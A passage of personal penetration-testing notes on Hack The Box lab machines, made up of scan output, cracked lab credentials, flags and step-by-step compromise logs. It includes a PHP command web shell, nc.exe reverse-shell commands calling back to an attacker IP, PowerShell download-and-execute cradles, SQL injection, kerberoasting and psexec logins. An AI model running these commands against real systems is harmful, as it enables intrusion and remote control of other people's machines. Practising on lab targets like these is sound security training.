OPTIONS <br />+ OSVDB-397: HTTP method (&#39;Allow&#39; Header): &#39;PUT&#39; method could allow clients to save files on the web server.<br />+ OSVDB-5646: HTTP method (&#39;Allow&#39; Header): &#39;DELETE&#39; may allow clients to remove files on the web server.<br />+ Web Server returns a valid response with junk HTTP methods, this may cause false positives.<br />+ /examples/servlets/index.html: Apache Tomcat default JSP pages present.<br />+ OSVDB-3720: /examples/jsp/snp/snoop.jsp: Displays information about page retrievals, including other users.<br />+ Default account found for &#39;Tomcat Manager Application&#39; at /manager/html (ID &#39;tomcat&#39;, PW &#39;s3cret&#39;). Apache Tomcat.<br />+ /host-manager/html: Default Tomcat Manager / Host Manager interface found<br />+ /manager/html: Tomcat Manager / Host Manager interface found (pass protected)<br />+ /manager/status: Tomcat Server Status interface found (pass protected)<br />+ 7967 requests: 0 error(s) and 14 item(s) reported on remote host<br />+ End Time:           2020-04-01 11:11:53 (GMT-4) (1265 seconds)<br />---------------------------------------------------------------------------<br />+ 1 host(s) tested<br /></div><div class='page'><h1 class='title level-7'>dirsearch</h1><br/>python3 /Yeet/Tools/dirsearch/dirsearch.py -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -e php -f -t 20 -u <a href="http://10.10.10.95:8080">http://10.10.10.95:8080</a> --simple-report dirsearchsimple_10.10.10.95:8080<br /><br /> _|. _ _  _  _  _ _|_    v0.3.9<br />(_||| _) (/_(_|| (_| )<br /><br />Extensions: php | HTTP method: get | Threads: 20 | Wordlist size: 441041<br /><br />Error Log: /Yeet/Tools/dirsearch/logs/errors-20-04-01_10-50-49.log<br /><br />Target: <a href="http://10.10.10.95:8080">http://10.10.10.95:8080</a><br /><br />[10:50:49] Starting: <br />[10:50:51] 200 -   19KB - /docs/<br />[10:51:02] 200 -    1KB - /examples/<br />[10:52:03] 302 -    0B  - /manager/  -&gt;  /manager/html<br />[10:56:24] 400 -    0B  - /http%3A%2F%2F<a href="http://www.php">www.php</a><br />[10:56:24] 400 -    0B  - /http%3A%2F%2Fwww/<br />[11:04:43] 400 -    0B  - /http%3A%2F%2Fyoutube/<br />[11:04:43] 400 -    0B  - /http%3A%2F%2Fyoutube.php<br />[11:08:00] 400 -    0B  - /http%3A%2F%2Fblogs.php<br />[11:08:00] 400 -    0B  - /http%3A%2F%2Fblogs/<br />[11:08:31] 400 -    0B  - /http%3A%2F%2Fblog.php<br />[11:08:31] 400 -    0B  - /http%3A%2F%2Fblog/<br />[11:11:05] 400 -    0B  - /%2A%2Ahttp%3A%2F%2Fwww/<br />[11:11:05] 400 -    0B  - /%2A%2Ahttp%3A%2F%2F<a href="http://www.php">www.php</a><br />[11:30:31] 400 -    0B  - /External%5CX-News.php<br />[11:30:31] 400 -    0B  - /External%5CX-News/<br />[11:38:34] 400 -    0B  - /http%3A%2F%2Fcommunity/<br />[11:38:34] 400 -    0B  - /http%3A%2F%2Fcommunity.php<br />[11:41:00] 400 -    0B  - /http%3A%2F%2Fradar.php<br />[11:41:00] 400 -    0B  - /http%3A%2F%2Fradar/<br />CTRL+C detected: Pausing threads, please wait...<br /><br />Canceled by the user<br />squid@CoolHandKali:/Yeet/Machines/HTB/Jerry$ <br /></div><div class='page'><h1 class='title level-7'>nmap web</h1><br/><br />PORT     STATE SERVICE REASON  VERSION<br />8080/tcp open  http    syn-ack Apache Tomcat/Coyote JSP engine 1.1<br />|_http-server-header: Apache-Coyote/1.1<br /></div><div class='page'><h1 class='title level-6'>nikto</h1><br/>squid@CoolHandKali:/Yeet/Machines/HTB/Jerry$ HYDRA_PROXY_HTTP=<a href="http://127.0.0.1:8080">http://127.0.0.1:8080</a> hydra -C  /usr/share/seclists/Passwords/Default-Credentials/tomcat-betterdefaultpasslist.txt -s 8080 10.10.10.95 http-get /manager/html<br />Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.<br /><br />Hydra (<a href="https://github.com/vanhauser-thc/thc-hydra)">https://github.com/vanhauser-thc/thc-hydra)</a> starting at 2020-04-01 11:54:25<br />[INFO] Using HTTP Proxy: <a href="http://127.0.0.1:8080">http://127.0.0.1:8080</a><br />[DATA] max 16 tasks per 1 server, overall 16 tasks, 79 login tries, ~5 tries per task<br />[DATA] attacking http-get://10.10.10.95:8080/manager/html<br />[8080][http-get] host: 10.10.10.95   login: admin   password: admin<br />[8080][http-get] host: 10.10.10.95   login: admin   password: admin<br />[8080][http-get] host: 10.10.10.95   login: tomcat   password: s3cret<br />[8080][http-get] host: 10.10.10.95   login: tomcat   password: s3cret<br />1 of 1 target successfully completed, 4 valid passwords found<br />Hydra (<a href="https://github.com/vanhauser-thc/thc-hydra)">https://github.com/vanhauser-thc/thc-hydra)</a> finished at 2020-04-01 11:54:45<br /></div><div class='page'><h1 class='title level-5'>flags</h1><br/>user.txt<br />7004dbcef0f854e0fb401875f26ebd00<br />root.txt<br />04a8b36e1545a455393d067e772fe90e<br /></div><div class='page'><h1 class='title level-4'>10.10.10.97 Secnotes</h1><br/>nmap found that 80, 445 and 8808 were open.<br />80 was running a webserver that allowed you to make an account and then take notes.<br />if you made an account with the name and password     &#39; or 1=1;-- -   you were dumped into the admins notes screen. This gave you his smb password.<br />tyler 92g!mA8BGjOirkL%OG*&amp;<br />smbmap showed me that there was a sharefolder I had access to named new-site<br />smbclient -L 10.10.10.97 -U tyler<br />Logged in with smbclient<br />smbclient &#39;//10.10.10.97/new-site&#39; -U tyler<br />uploaded a simple php web shell and nc.exe from the /usr/share/websomething<br /><br />&lt;HTML&gt;&lt;BODY&gt;<br />&lt;FORM METHOD=&quot;GET&quot; NAME=&quot;myform&quot; ACTION=&quot;&quot;&gt;<br />&lt;INPUT TYPE=&quot;text&quot; NAME=&quot;cmd&quot;&gt;<br />&lt;INPUT TYPE=&quot;submit&quot; VALUE=&quot;Send&quot;&gt;<br />&lt;/FORM&gt;<br />&lt;pre&gt;<br />&lt;?php<br />if($_GET[&#39;cmd&#39;]) {<br />      system($_GET[&#39;cmd&#39;]);<br />        }<br />?&gt;<br />&lt;/pre&gt;<br />&lt;/BODY&gt;&lt;/HTML&gt;<br /><br />curl <a href="http://10.10.10.97:8808/3232.php?cmd=nc.exe+-e+cmd.exe+10.10.14.3+3232">http://10.10.10.97:8808/3232.php?cmd=nc.exe+-e+cmd.exe+10.10.14.3+3232</a><br />nc -nlvp 3232 caught it. User shell as tyler.<br /><br />On tylers desktop there was a file named bash.lnk (looks like windows subsytem for linux is on this box).<br />bash.lnk shits itself and points so a directory that is not there (c:\windows\system32\bash.exe)<br />I run a findstr to find bash.exe<br />cd c:\windows<br />dir /s /b | findstr bash.exe<br /><br />turns out, bash.exe is in some system sxs file super deep.<br />copy and run it... now we are in WSL bash!!<br />in the root ~ directory I look at the ./bash_history and see that the administrator account has used smbclient form here and passed creds in clear text!<br />administrator%u6!4ZwgwOM#^OBf#Nwnh&#39;<br />smbclient -U &#39;administrator%u6!4ZwgwOM#^OBf#Nwnh&#39; \\\\10.10.10.97\\c$<br />Login successful!<br /><br />winexe -U administrator //10.10.10.97 cmd.exe</div><div class='page'><h1 class='title level-5'>enumeration</h1><br/>92g!mA8BGjOirkL%OG*&amp;<br /><br />administrator%u6!4ZwgwOM#^OBf#Nwnh&#39;</div><div class='page'><h1 class='title level-6'>kickoff nmap</h1><br/>nikto -host <a href="http://10.10.10.97:80">http://10.10.10.97:80</a> <br />- Nikto v2.1.6<br />---------------------------------------------------------------------------<br />+ Target IP:          10.10.10.97<br />+ Target Hostname:    10.10.10.97<br />+ Target Port:        80<br />+ Start Time:         2021-02-13 00:02:55 (GMT-5)<br />---------------------------------------------------------------------------<br />+ Server: Microsoft-IIS/10.0<br />+ Retrieved x-powered-by header: PHP/7.2.7<br />+ The anti-clickjacking X-Frame-Options header is not present.<br />+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS<br />+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type<br />+ Cookie PHPSESSID created without the httponly flag<br />+ Root page / redirects to: login.php<br />+ No CGI Directories found (use &#39;-C all&#39; to force check all possible dirs)<br />+ Allowed HTTP Methods: OPTIONS, TRACE, GET, HEAD, POST <br />+ Public HTTP Methods: OPTIONS, TRACE, GET, HEAD, POST <br />+ /login.php: Admin login page/section found.<br />+ 7863 requests: 0 error(s) and 8 item(s) reported on remote host<br />+ End Time:           2021-02-13 00:21:36 (GMT-5) (1121 seconds)<br />---------------------------------------------------------------------------<br />+ 1 host(s) tested<br /></div><div class='page'><h1 class='title level-6'>80 nikto</h1><br/>nikto -host <a href="http://10.10.10.97:80">http://10.10.10.97:80</a> <br />- Nikto v2.1.6<br />---------------------------------------------------------------------------<br />+ Target IP:          10.10.10.97<br />+ Target Hostname:    10.10.10.97<br />+ Target Port:        80<br />+ Start Time:         2021-02-13 00:02:55 (GMT-5)<br />---------------------------------------------------------------------------<br />+ Server: Microsoft-IIS/10.0<br />+ Retrieved x-powered-by header: PHP/7.2.7<br />+ The anti-clickjacking X-Frame-Options header is not present.<br />+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS<br />+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type<br />+ Cookie PHPSESSID created without the httponly flag<br />+ Root page / redirects to: login.php<br />+ No CGI Directories found (use &#39;-C all&#39; to force check all possible dirs)<br />+ Allowed HTTP Methods: OPTIONS, TRACE, GET, HEAD, POST <br />+ Public HTTP Methods: OPTIONS, TRACE, GET, HEAD, POST <br />+ /login.php: Admin login page/section found.<br />+ 7863 requests: 0 error(s) and 8 item(s) reported on remote host<br />+ End Time:           2021-02-13 00:21:36 (GMT-5) (1121 seconds)<br />---------------------------------------------------------------------------<br />+ 1 host(s) tested<br /></div><div class='page'><h1 class='title level-5'>flags</h1><br/>user.txt<br />6fa7556968052a83183fb8099cb904f3<br />root.txt<br />7250cde1cab0bbd93fc1edbdc83d447b</div><div class='page'><h1 class='title level-4'>10.10.10.98 Access</h1><br/>nmap showed that ftp, telnet, and http were open.<br />FTP anonymous was enabled and I was able to wget 2 files “Access Control.zip” and backup.mdb<br />using strings I pulled all strings of 8 letters or greater to make words.txt<br />zip2john on “Access Contorl.zip” (making AChash.txt)<br />used john on AChash.txt against words.txt and got the password         access4u@security       to open the zip file<br />used 7z and the new password to unzip &quot;Access Control.zip&quot; <br />new file is “Access Control.pst”<br />used readpst to create “Access Control.mbox”<br />Reading through “Access Control.mbox” gave me the username and password security:4Cc3ssC0ntr0ller<br />The creds were successful for telnet!<br />User flag owned!<br />while dir-ing around I saw that the desktop dir of the public users was hidden<br />inside the desktop dir was a link the file “ZKAccess3.5 Security System.lnk”<br />typeing it showed that it was running some kind of runas command and the /savecred argument. a microsoft lnk vulnerability!<br />This command with a nc listener brought it home<br />    runas /user:ACCESS\Administrator /savecred &quot;powershell \&quot;IEX(new-object net.webclient).downloadstring(&#39;<a href="http://10.10.14.60:8000/iptcp.ps1')">http://10.10.14.60:8000/iptcp.ps1&#39;)</a><br />    <br />    Rooted!!<br /><br /><br /><br /><br /><br /><br /><br /><br /><br />4Cc3ssC0ntr0ller</div><div class='page'><h1 class='title level-5'>enumeration</h1><br/>root@CoolHandKali:/Yeet/Machines/HTB/Access# john AC.hash --wordlist=words.txt<br />Using default input encoding: UTF-8<br />Loaded 1 password hash (ZIP, WinZip [PBKDF2-SHA1 256/256 AVX2 8x])<br />Will run 2 OpenMP threads<br />Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status<br />access4u@security (Access Control.zip/Access Control.pst)<br /><br /><br />he password for the “security” account has been changed to 4Cc3ssC0ntr0ller.  Please ensure this is passed on to your engineers.<br />4Cc3ssC0ntr0ller<br /><br />powershell.exe IEX(New-Object Net.WebClient).downloadString(&#39;<a href="http://10.10.14.60/80/sherlock.ps1')">http://10.10.14.60:8000/Invoke-PowerShellTcp.ps1&#39;)</a>  <br />powershell.exe IEX(New-Object system.Net.WebClient).downloadFile(&#39;<a href="http://10.10.14.60/80/sherlock.ps1')">http://10.10.14.60:8000/winPEAS.exe&#39;, C:\users\security\winPEAS.exe)</a>  <br />IEX(New-Object Net.WebClient).downloadString(&#39;<a href="http://10.10.14.60/80/sherlock.ps1')">http://10.10.14.60:8000/PowerUp.ps1&#39;)</a>  <br />IEX(New-Object Net.WebClient).downloadString(&#39;<a href="http://10.10.14.60/80/sherlock.ps1')">http://10.10.14.60:8000/jaws-enum.ps1&#39;)</a>  <br /><br /><br />runas /user:access\administrator /savecred &quot;powershell \&quot;IEX(new-object net.webclient).downloadstring(&#39;<a href="http://10.10.14.60:8000/3233.ps1')\""">http://10.10.14.60:8000/3233.ps1&#39;)\&quot;&quot;</a></div><div class='page'><h1 class='title level-6'>nmap</h1><br/>echo -e e[5me[31me[1mttl=127e[0m; echo <a href="http://www.kellyodonnell.com/content/determining-os-type-ping;">http://www.kellyodonnell.com/content/determining-os-type-ping;</a> nmap 10.10.10.98<br />ttl=127<br /><a href="http://www.kellyodonnell.com/content/determining-os-type-ping">http://www.kellyodonnell.com/content/determining-os-type-ping</a><br />Starting Nmap 7.80 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2020-04-01 12:39 EDT<br />Nmap scan report for 10.10.10.98<br />Host is up (0.15s latency).<br />Not shown: 997 filtered ports<br />PORT   STATE SERVICE<br />21/tcp open  ftp<br />23/tcp open  telnet<br />80/tcp open  http<br /><br />Nmap done: 1 IP address (1 host up) scanned in 11.14 seconds<br /></div><div class='page'><h1 class='title level-6'>nmap version</h1><br/>nmap -sC -sV 10.10.10.98<br />Starting Nmap 7.80 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2020-04-01 12:39 EDT<br />Nmap scan report for 10.10.10.98<br />Host is up (0.14s latency).<br />Not shown: 997 filtered ports<br />PORT   STATE SERVICE VERSION<br />21/tcp open  ftp     Microsoft ftpd<br />| ftp-anon: Anonymous FTP login allowed (FTP code 230)<br />|_Can&#39;t get directory listing: PASV failed: 425 Cannot open data connection.<br />| ftp-syst: <br />|_  SYST: Windows_NT<br />23/tcp open  telnet?<br />80/tcp open  http    Microsoft IIS httpd 7.5<br />| http-methods: <br />|_  Potentially risky methods: TRACE<br />|_http-server-header: Microsoft-IIS/7.5<br />|_http-title: MegaCorp<br />Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows<br /><br />Service detection performed. Please report any incorrect results at <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> .<br />Nmap done: 1 IP address (1 host up) scanned in 194.18 seconds</div><div class='page'><h1 class='title level-6'>web</h1><br/></div><div class='page'><h1 class='title level-7'>nmap web</h1><br/>PORT   STATE SERVICE REASON  VERSION<br />80/tcp open  http    syn-ack Microsoft IIS httpd 7.5<br />|_http-server-header: Microsoft-IIS/7.5<br />Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows<br /><br /></div><div class='page'><h1 class='title level-7'>dirsearch</h1><br/>python3 /Yeet/Tools/dirsearch/dirsearch.py -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -e php -f -t 20 -u <a href="http://10.10.10.98:80">http://10.10.10.98:80</a> --simple-report dirsearchsimple_10.10.10.98:80<br /><br /> _|. _ _  _  _  _ _|_    v0.3.9<br />(_||| _) (/_(_|| (_| )<br /><br />Extensions: php | HTTP method: get | Threads: 20 | Wordlist size: 441041<br /><br />Error Log: /Yeet/Tools/dirsearch/logs/errors-20-04-01_12-48-57.log<br /><br />Target: <a href="http://10.10.10.98:80">http://10.10.10.98:80</a><br /><br />[12:48:57] Starting: <br /><br />Task Completed<br />squid@CoolHandKali:/Yeet/Machines/HTB/Access$ </div><div class='page'><h1 class='title level-7'>nikto</h1><br/>nikto -host <a href="http://10.10.10.98:80">http://10.10.10.98:80</a> | tee nikto_10.10.10.98:80<br />- Nikto v2.1.6<br />---------------------------------------------------------------------------<br />+ Target IP:          10.10.10.98<br />+ Target Hostname:    10.10.10.98<br />+ Target Port:        80<br />+ Start Time:         2020-04-01 12:48:55 (GMT-4)<br />---------------------------------------------------------------------------<br />+ Server: Microsoft-IIS/7.5<br />+ Retrieved x-powered-by header: ASP.NET<br />+ The anti-clickjacking X-Frame-Options header is not present.<br />+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS<br />+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type<br />+ Retrieved x-aspnet-version header: 4.0.30319<br />+ No CGI Directories found (use &#39;-C all&#39; to force check all possible dirs)<br />+ Allowed HTTP Methods: OPTIONS, TRACE, GET, HEAD, POST <br />+ Public HTTP Methods: OPTIONS, TRACE, GET, HEAD, POST <br />+ 7863 requests: 0 error(s) and 7 item(s) reported on remote host<br />+ End Time:           2020-04-01 13:08:45 (GMT-4) (1190 seconds)<br />---------------------------------------------------------------------------<br />+ 1 host(s) tested<br />squid@CoolHandKali:/Yeet/Machines/HTB/Access$ ^C<br /></div><div class='page'><h1 class='title level-5'>flags</h1><br/>user<br />ff1f3b48913b213a31ff6756d2553d38<br />root<br />6e1586cc7ab230a8d297e8f933d904cf</div><div class='page'><h1 class='title level-4'>10.10.10.98 Access2</h1><br/>nmap showed that 21, 23, and 80 were open.<br />80 is just a picture<br />21 is ftp annonymous, allowing me to download (via wget (thanks TireFire)) the two files. backup.mdb and Access Control.zip<br />following the methodology of ippsec...<br /><br />mkdir tables<br />for i in $(mdb-tables file.mdb); do mdb-export file.mdb $i &gt; tables/$i; done        this will make a directory full of contets for each table locally.<br />cd tables<br />grep -r passw<br /><br />this gave me three usernames and passwords. one of them being engineer:access4u@security.<br />Access Control.zip was locked. The previous password unlocks it.<br />the file is a pst. I use readpst to trun it into a .mbox file<br />more Access Control.mbox shows lets me read the file. I see the following line...<br />The password for the “security” account has been changed to 4Cc3ssC0ntr0ller.  Please ensure this is passed on to your engineers.<br /><br />telnet 10.10.10.98 <br />security<br />4Cc3ssC0ntr0ller<br />&lt;user shell&gt;<br /><br />winPEAS fails to run<br />jaws shows me the following line...<br /><br />-----------------------------------------------------------<br /> Stored Credentials<br />-----------------------------------------------------------<br /><br />Currently stored credentials:<br /><br />    Target: Domain:interactive=ACCESS\Administrator<br />    Type: Domain Password<br />    User: ACCESS\Administrator<br /><br />this information is what you get from cmdkey /list<br />I go to payload all the things searching for &quot;stored credentials&quot;<br /><br />runas /savecred /user:ACCESS\Administrator &quot;C:\users\security\desktop\nc.exe -e cmd.exe 10.10.14.3 3232&quot;<br />nc -nlvp 3232<br /><br />&lt;root&gt;</div><div class='page'><h1 class='title level-5'>enumeration</h1><br/>Windows 7? (IIS 7.5)<br /><br />admin admin<br />engineer access4u@security<br />backup_admin admin<br /><br /><br /><br />security 4Cc3ssC0ntr0ller <br /><br /><br />telnet 10.10.10.98<br />security<br />4Cc3ssC0ntr0ller<br />&lt;user shell&gt;<br /><br /><br /><br />Microsoft Windows Server 2008 R2 Standard<br />engineer user also exists<br /><br />powershell &quot;IEX(new-object net.webclient).downloadfile(&#39;http://10.10.14.3/winPEAS.exe&#39;,&#39;c:\users\security\desktop\winPEAS.exe&#39;)&quot;<br />powershell “IEX(new-object net.webclient).downloadstring(&#39;http://10.10.14.3/jaws.ps1&#39;)&quot;<br /><br />runas /savecred /user:ACCESS\Administrator &quot;C:\users\security\desktop\nc.exe -e cmd.exe 10.10.14.3 3232&quot;<br />powershell &quot;IEX(new-object net.webclient).downloadfile(&#39;http://10.10.14.3/nc.exe&#39;,&#39;c:\users\security\desktop\nc.exe&#39;)&quot;</div><div class='page'><h1 class='title level-6'>nmap</h1><br/></div><div class='page'><h1 class='title level-5'>flags</h1><br/></div><div class='page'><h1 class='title level-3'>100-199</h1><br/></div><div class='page'><h1 class='title level-4'>10.10.10.100 Active</h1><br/>nmap showed that ass loads of ports were open. Most notably 53, 88, and smb<br />long nmap never finished.<br /><br />Enum4Linux showed me that there were shares<br />smbmap showed me that I could anonymous READ ONlY Replication<br />connected with smbclient and get * the entire dir<br />after looking through all the stuff I found username and hashed password in a groups.xml file<br />I used gpp-decrypty (built into kali) to get the password GPPstillStandingStrong2k18 for the user active.htb\SVC_TGS<br /><br />re-running enum4linux with creds was fruitless<br />re-running smbmap with creds showed me READ ONLY  to NETLOGON, SYSVOL, Replication, and Users<br /><br />after paging through all of the stuffs (there was not much other than user.txt) I deemed that I needed to try some stuff with the creds.<br /><br />psexec failed<br />evil-winrm failed<br />kerberoast worked! (GetUserSPNs.py)<br /><br />got be a krbtgt hash<br />hashcat example hash showed me that it was a method 13100<br />put the hash on the local windows box<br />hashcat64.exe -m 13100 yeet\active.txt yeet\rockyou.txt<br />got the creds        administrator Ticketmaster1968<br /><br />lets try psexec again...<br />psexec.py active.htb/svc_tgs@10.10.10.100<br />success!!!<br />root.txt as system</div><div class='page'><h1 class='title level-5'>enumeration</h1><br/>root@kali:~/Desktop/Machines/HTB/Active# gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ<br />/usr/bin/gpp-decrypt:21: warning: constant OpenSSL::Cipher::Cipher is deprecated<br />GPPstillStandingStrong2k18<br /><br />gpp-decrypt is GOLD<br />^^groups.xml</div><div class='page'><h1 class='title level-6'>nmap</h1><br/>echo -e e[5me[31me[1mttl=127e[0m; echo <a href="http://www.kellyodonnell.com/content/determining-os-type-ping;">http://www.kellyodonnell.com/content/determining-os-type-ping;</a> nmap 10.10.10.100<br />ttl=127<br /><a href="http://www.kellyodonnell.com/content/determining-os-type-ping">http://www.kellyodonnell.com/content/determining-os-type-ping</a><br />Starting Nmap 7.70 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2019-12-20 21:38 EST<br />Nmap scan report for 10.10.10.100<br />Host is up (0.094s latency).<br />Not shown: 983 closed ports<br />PORT      STATE SERVICE<br />53/tcp    open  domain<br />88/tcp    open  kerberos-sec<br />135/tcp   open  msrpc<br />139/tcp   open  netbios-ssn<br />389/tcp   open  ldap<br />445/tcp   open  microsoft-ds<br />464/tcp   open  kpasswd5<br />593/tcp   open  http-rpc-epmap<br />636/tcp   open  ldapssl<br />3268/tcp  open  globalcatLDAP<br />3269/tcp  open  globalcatLDAPssl<br />49152/tcp open  unknown<br />49153/tcp open  unknown<br />49154/tcp open  unknown<br />49155/tcp open  unknown<br />49157/tcp open  unknown<br />49158/tcp open  unknown<br /><br />Nmap done: 1 IP address (1 host up) scanned in 9.00 seconds<br /></div><div class='page'><h1 class='title level-6'>nmap long</h1><br/></div><div class='page'><h1 class='title level-6'>smbclient</h1><br/>root@kali:~/Desktop/Machines/HTB/Active# smbmap -H 10.10.10.100<br />[+] Finding open SMB ports....<br />[+] User SMB session establishd on 10.10.10.100...<br />[+] IP: 10.10.10.100:445	Name: 10.10.10.100                                      <br />	Disk                                                  	Permissions<br />	----                                                  	-----------<br />	ADMIN$                                            	NO ACCESS<br />	C$                                                	NO ACCESS<br />	IPC$                                              	NO ACCESS<br />	NETLOGON                                          	NO ACCESS<br />	Replication                                       	READ ONLY<br />	SYSVOL                                            	NO ACCESS<br />	Users                                             	NO ACCESS<br />root@kali:~/Desktop/Machines/HTB/Active# <br /></div><div class='page'><h1 class='title level-7'>post acitvie.htb creds</h1><br/>smbmap -u SVC_TGS -d active.htb -p &#39;GPPstillStandingStrong2k18&#39; -H 10.10.10.100<br />[+] Finding open SMB ports....<br />[+] User SMB session establishd on 10.10.10.100...<br />[+] IP: 10.10.10.100:445	Name: active.htb                                        <br />	Disk                                                  	Permissions<br />	----                                                  	-----------<br />	ADMIN$                                            	NO ACCESS<br />	C$                                                	NO ACCESS<br />	IPC$                                              	NO ACCESS<br />	NETLOGON                                          	READ ONLY<br />	Replication                                       	READ ONLY<br />	SYSVOL                                            	READ ONLY<br />	Users                                             	READ ONLY<br />root@kali:~/Desktop/Machines/HTB/Active# <br /></div><div class='page'><h1 class='title level-6'>passwords</h1><br/>Administrator121180624185345Z0P1<br /><br />cpassword=&quot;edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ&quot; changeLogon=&quot;0&quot; noChange=&quot;1&quot; neverExpires=&quot;1&quot; acctDisabled=&quot;0&quot; userName=&quot;active.htb\SVC_TGS&quot;/&gt;&lt;/User&gt;<br />&lt;/Groups&gt;<br /><br />root@kali:~/Desktop/Machines/HTB/Active# gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ<br />/usr/bin/gpp-decrypt:21: warning: constant OpenSSL::Cipher::Cipher is deprecated<br />GPPstillStandingStrong2k18<br /><br /><br />administrator Ticketmaster1968</div><div class='page'><h1 class='title level-5'>flags</h1><br/>user<br />    86d67d8ba232bb6a254aa4d10159e983<br />root<br />    b5fc76d1d6b91d77b2fbf2d54d0f708b</div><div class='page'><h1 class='title level-4'>10.10.10.100 Active2</h1><br/>nmap showed that an ass load of ports were running.<br />in my dns enumeration I saw that active.htb needed to be added to /etc/hosts<br />smbmap -H 10.10.10.100 showed that there were a bunch of smb directories<br />I could read the Replication directory<br />smbclient -N &#39;//10.10.10.100/Replication&#39; let me connect to that share.<br />in smb client I did the  | mask “” | recurse ON | prompt OFF | mget *       technique to download all the files<br />grep -r pass showed me that there may be a password in groups.xml<br />I was able to crack the password with gpp-decrypt!<br />active.htb\SVC_TGS<br />GPPstillStandingStrong2k18   <br />I reran smbmap with my new creds<br />smbmap -u svc_tgs -p GPPstillStandingStrong2k18<br />and saw that I could now read the USERS share<br />connected to that share with smbclient<br />smbclient -h &#39;\\10.10.10.100\users&#39; -U svc_tgs -W active.htb    Then prompted for a password<br />In the SVC_TGS directory was the user.txt flag<br />Usered!!<br /><br />In re-runing the impacket tools with creds I saw that the box was kerberoastable!<br />GetUserSPNs.py active.htb/svc_tgs:GPPstillStandingStrong2k18 -request           dumped a hashed password for Administrator!!<br />put the hashagainst hashcat on my local machine (-m 13100)<br />cracked!! Ticketmaster1968<br />psexec in...<br />psexec.py active.htb/administrator:Ticketmaster1968@10.10.10.100<br />rooted!!</div><div class='page'><h1 class='title level-5'>enumeration</h1><br/>hostname needed to be added to /etc/hosts (active.htb and active)<br /><br />active.htb\SVC_TGS<br />GPPstillStandingStrong2k18                  <br /><br /><br /><br /><br />squid@CoolHandKali:/Yeet/Machines/HTB/Active$ GetUserSPNs.py active.htb/svc_tgs:GPPstillStandingStrong2k18 <br />Impacket v0.9.22.dev1+20200327.103853.7e505892 - Copyright 2020 SecureAuth Corporation<br /><br />ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation <br />--------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------<br />active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 15:06:40.351723  2018-07-30 13:17:40.656520  <br /><br />Ticketmaster1968</div><div class='page'><h1 class='title level-6'>smart nmap</h1><br/>nmap 10.10.10.100 &amp;&amp; nmap -sC -sV 10.10.10.100 &amp;&amp; nmap -p- 10.10.10.100<br />Starting Nmap 7.80 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2020-04-03 17:17 EDT<br />Nmap scan report for 10.10.10.100<br />Host is up (0.13s latency).<br />Not shown: 983 closed ports<br />PORT      STATE SERVICE<br />53/tcp    open  domain<br />88/tcp    open  kerberos-sec<br />135/tcp   open  msrpc<br />139/tcp   open  netbios-ssn<br />389/tcp   open  ldap<br />445/tcp   open  microsoft-ds<br />464/tcp   open  kpasswd5<br />593/tcp   open  http-rpc-epmap<br />636/tcp   open  ldapssl<br />3268/tcp  open  globalcatLDAP<br />3269/tcp  open  globalcatLDAPssl<br />49152/tcp open  unknown<br />49153/tcp open  unknown<br />49154/tcp open  unknown<br />49155/tcp open  unknown<br />49157/tcp open  unknown<br />49158/tcp open  unknown<br /><br />Nmap done: 1 IP address (1 host up) scanned in 17.65 seconds<br />Starting Nmap 7.80 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2020-04-03 17:17 EDT<br />Nmap scan report for 10.10.10.100<br />Host is up (0.15s latency).<br />Not shown: 983 closed ports<br />PORT      STATE SERVICE       VERSION<br />53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)<br />| dns-nsid: <br />|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)<br />88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2020-04-03 21:17:44Z)<br />135/tcp   open  msrpc         Microsoft Windows RPC<br />139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn<br />389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)<br />445/tcp   open  microsoft-ds?<br />464/tcp   open  kpasswd5?<br />593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0<br />636/tcp   open  tcpwrapped<br />3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)<br />3269/tcp  open  tcpwrapped<br />49152/tcp open  msrpc         Microsoft Windows RPC<br />49153/tcp open  msrpc         Microsoft Windows RPC<br />49154/tcp open  msrpc         Microsoft Windows RPC<br />49155/tcp open  msrpc         Microsoft Windows RPC<br />49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0<br />49158/tcp open  msrpc         Microsoft Windows RPC<br />Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows<br /><br />Host script results:<br />|_clock-skew: -3s<br />| smb2-security-mode: 